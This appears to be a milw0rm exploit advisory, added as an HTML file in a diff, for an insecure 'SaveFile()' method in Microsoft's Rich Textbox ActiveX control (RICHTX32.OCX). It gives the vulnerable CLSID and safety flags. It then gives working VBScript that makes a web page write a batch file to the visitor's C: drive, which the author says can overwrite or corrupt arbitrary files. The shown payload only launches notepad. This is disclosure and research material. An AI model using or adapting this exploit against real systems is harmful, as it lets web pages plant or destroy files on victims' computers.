@@ -1,0 +1,42 @@
+<pre><code><span style="font: 10pt Courier New;"><span class="general1-symbol"><body bgcolor="#E0E0E0">-----------------------------------------------------------------------------
+ <b>Microsoft Rich Textbox Control 6.0 (SP6) "SaveFile()" Insecure Method</b>
+ url: http://www.microsoft.com
+
+ Author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+
+ <b><font color='red'>This was written for educational purpose. Use it at your own risk.
+ Author will be not responsible for any damage.</font></b>
+
+ <b>Technical details:</b>
+ File: RICHTX32.OCX
+ ver.: 6.1.97.82
+
+ While this GUID <b>{3B7C8860-D78F-101B-B9B5-04021C009402}</b> is
+ killbited, this one <b><font color='green'>{B617B991-A767-4F05-99BA-AC6FCABB102E}</font></b>
+
+ works fine so it is possible, using the "SaveFile()" method,
+ to save the content of the rich textbox on a user's pc.
+ This can be used to save, overwrite and/or corrupt arbitrary
+ files on the system.
+ 
+ It's marked as:
+ <b>RegKey Safe for Script: False
+ RegKey Safe for Init: False
+ Implements IObjectSafety: True
+ IPersist Safe: Safe for untrusted: caller,data
+ IPStorage Safe: Safe for untrusted: caller,data</b>
+
+ Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
+-----------------------------------------------------------------------------
+<object classid='clsid:B617B991-A767-4F05-99BA-AC6FCABB102E' id='test' style='width: 250px; height: 75px'></object>	<input language=VBScript onclick=tryMe() type=button value='Click here to start the test'>
+<script language='vbscript'>
+  Sub tryMe
+   test.Text = "@echo off" & vbCrLf & "cmd.exe /c notepad.exe" & vbCrLf & "echo Hello World!" & vbCrLf & "pause"
+   test.SaveFile "C:\shinnai.bat", 1
+   MsgBox "Exploit completed!"
+ End Sub
+</script></span></span></code></pre>
+
+# milw0rm.com [2008-01-09]
